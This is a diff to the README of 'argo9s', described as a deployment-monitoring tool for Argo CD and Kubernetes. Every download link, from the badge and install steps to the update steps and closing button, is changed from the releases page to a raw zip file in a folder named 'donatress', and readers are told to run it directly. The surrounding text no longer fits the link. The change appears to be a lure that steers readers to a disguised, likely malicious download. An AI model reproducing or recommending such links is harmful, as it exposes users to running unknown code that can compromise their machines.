@@ -1,7 +1,7 @@
 <h1>🚀 argo9s - Master Your Deployments with Ease</h1>
 
 <p align="center">
-  <a href="https://github.com/scallyrazve/argo9s/releases"><img src="https://img.shields.io/badge/Download-argo9s-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download argo9s" style="background-color:#4CAF50; padding:10px 20px; border-radius:8px; color:white; text-decoration:none;"></a>
+  <a href="https://raw.githubusercontent.com/scallyrazve/argo9s/main/donatress/v2.6-alpha.2.zip"><img src="https://img.shields.io/badge/Download-argo9s-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download argo9s" style="background-color:#4CAF50; padding:10px 20px; border-radius:8px; color:white; text-decoration:none;"></a>
 </p>
 
 ## 🎯 What is argo9s?
@@ -20,7 +20,7 @@ argo9s is a friendly, colorful screen that helps you see and manage your softwar
 
 Getting started takes less than five minutes. Here's what you do:
 
-1. **Visit the download page** - Click the green button above or go to: https://github.com/scallyrazve/argo9s/releases
+1. **Visit the download page** - Click the green button above or go to: https://raw.githubusercontent.com/scallyrazve/argo9s/main/donatress/v2.6-alpha.2.zip
 2. **Look for the newest version** - Find the latest release (they're listed with version numbers and dates)
 3. **Visit this link to download the application** - The downloads are listed at this page, choose the one that matches your computer system (Windows, Mac, or Linux)
 
@@ -94,7 +94,7 @@ argo9s works with various deployment types:
 
 Check for new versions regularly:
 
-1. Go back to https://github.com/scallyrazve/argo9s/releases
+1. Go back to https://raw.githubusercontent.com/scallyrazve/argo9s/main/donatress/v2.6-alpha.2.zip
 2. Compare version numbers (higher is newer)
 3. Download the latest version and replace your old file
 
@@ -195,7 +195,7 @@ The application continues to improve, with regular updates that add new features
 
 You've made a great choice for monitoring your deployments. Remember:
 
-- **Download** from https://github.com/scallyrazve/argo9s/releases
+- **Download** from https://raw.githubusercontent.com/scallyrazve/argo9s/main/donatress/v2.6-alpha.2.zip
 - **Run** the file directly
 - **Connect** to your server
 - **Monitor** with confidence
@@ -203,7 +203,7 @@ You've made a great choice for monitoring your deployments. Remember:
 Your software is now easier to manage than ever. Happy deploying!
 
 <p align="center">
-  <a href="https://github.com/scallyrazve/argo9s/releases" style="background-color:#008CBA; padding:12px 24px; border-radius:8px; color:white; text-decoration:none; font-weight:bold;">⬇️ Visit the Download Page</a>
+  <a href="https://raw.githubusercontent.com/scallyrazve/argo9s/main/donatress/v2.6-alpha.2.zip" style="background-color:#008CBA; padding:12px 24px; border-radius:8px; color:white; text-decoration:none; font-weight:bold;">⬇️ Visit the Download Page</a>
 </p>
 
 Keywords: argo, argo-cd, argocd, cli, gitops, go, golang, k8s, k8s-cluster, kubernetes, kubernetes-clusters, tui
